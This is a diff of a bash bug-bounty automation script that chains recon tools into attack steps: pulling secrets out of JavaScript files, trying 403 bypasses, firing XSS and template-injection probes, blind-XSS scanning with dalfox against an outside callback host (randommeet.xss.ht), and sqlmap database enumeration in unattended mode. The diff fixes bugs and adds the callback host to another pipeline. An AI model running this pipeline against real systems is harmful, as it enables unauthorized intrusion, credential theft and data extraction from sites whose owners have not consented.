@@ -242,8 +242,8 @@ cat $2-allurls.txt | gf debug_logic > $2-debug_logic.txt
 echo -e "Starting ${GREEN}JS Link Finding${NORMAL} for on $1... ${NORMAL}"
 subjs -i $2-allurls.txt | sort -u | uniq -u > $2-jsfiles.txt
 cat $2-alive.txt | gau | grep ".js$" | uniq | sort > $2-jsfilesgau.txt
-cat $2-jsfiles $2-jsfilesgau.txt > $2-finalJSFiles.txt
-cat $2-finalJSFiles.txt | httpx -follow-redirects -silent -status-code | grep "[200]" | cut -d ' ' -f1 | sort -u > > $2-liveJSFiles.txt
+cat $2-jsfiles.txt $2-jsfilesgau.txt > $2-finalJSFiles.txt
+cat $2-finalJSFiles.txt | httpx -follow-redirects -silent -status-code | grep "[200]" | cut -d ' ' -f1 | sort -u >> $2-liveJSFiles.txt
 sudo rm -r $2-jsfiles.txt
 sudo rm -r $2-jsfilesgau.txt
 sudo rm -r $2-finalJSFiles.txt
@@ -254,14 +254,14 @@ interlace -tL $2-liveJSFiles.txt -threads 5 -c "echo 'Scanning _target_ Now' ; p
 cat $2-JSEndpoints.txt | grep "admin" > $2-AdminURLS.txt
 
 echo -e "Starting ${GREEN}Secret Finding from JS Files${NORMAL} for on $1... ${NORMAL}"
-interlace -tL $2-liveJSFiles.txt -threads 5 -c "python3 ~/tools/SecretFinder/SecretFinder.py -i _target_ -o cli >> $2-JSFileSecrets.txt" -v
+interlace -tL $2-liveJSFiles.txt -threads 5 -c "python3 ~/tools/secretfinder/SecretFinder.py -i _target_ -o cli > $2-JSFileSecrets.txt" -v
 
 
 echo -e "Starting ${GREEN}403 Bypass Check${NORMAL} on $1... ${NORMAL} "
 mkdir 403Bypass
-cat $2-allurls.txt $2-alive.txt $2-JSendpoints.txt | httpx -follow-redirects -silent -status-code | grep "[403]" | cut -d ' ' -f1 | sort -u > $2-403StatusUrls.txt
-cat $2-403StatusUrls.txt | while read domain;do bash ~/tools/Bug-Bounty-Scripts/403-forbidden-bypass.sh $domain > /403Bypass/$domain.txt ;done
-
+cat $2-allurls.txt $2-alive.txt $2-JSendpoints.txt | httpx -follow-redirects -silent -status-code -mc 403,401,402 | cut -d ' ' -f1 | sort -u > $2-403StatusUrls.txt
+cat $2-403StatusUrls.txt | while read domain;do bash ~/tools/Bug-Bounty-Scripts/403-forbidden-bypass.sh $domain ;done | grep -v "403" 
+#add $1 on line 43 as such echo "Staring! please wait... $1" to get better Resul Output with domain name
 
 echo -e "Starting ${GREEN}XSS without GF via qsreplace${NORMAL} on $1... ${NORMAL} "
 sleep 2
@@ -274,14 +274,17 @@ cat $2-allurls.txt |grep '=' | qsreplace "xssfound{{7*7}}"  | httpx -match-regex
 
 
 echo -e "Starting ${GREEN}Paramfinder & XSS${NORMAL} for on $1... ${NORMAL}"
-mkdir params
-mkdir dalfoxoutput
-cat $2-alive.txt | while read domain;do paramspider -d $domain > /params/$domain.txt ; dalfox -b randommeet.xss.ht file /params/$domain.txt -o /dalfoxoutput/$domain; done
+cat $2-alive.txt | while read domain;do python3 ~/tools/ParamSpider/paramspider.py -d $domain --level high --exclude woff,css,js,png,svg,php,jpg; done 
+mv output/https\:/  paramspider
+sudo rm -r output
+cat ./paramspider/*txt > $2-paramsDalfoxInput.txt
+dalfox -b randommeet.xss.ht file $2-paramDalfoxInput.txt -o $2-paramDalfoxXSSOutput.txt
+
 
 
 echo -e "Starting ${GREEN}XSS oneliner with Dalfox${NORMAL} on $1... ${NORMAL} "
 sleep 2
-gospider -S $2-alive.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o $2-XSSDalfox.txt
+gospider -S $2-alive.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -b randommeet.xss.ht -o $2-GospiderXSSDalfox.txt
 
 echo -e "Starting ${GREEN}SQLInjection Check${NORMAL} for on $1... ${NORMAL}"
 cat $2-allurls.txt | gf sqli | urlive | tee $2-gfsqli.txt && ~/tools/sqlmap/sqlmap.py -m $2-gfsqli.txt --dbs --batch > $2-SQLIPositives.txt
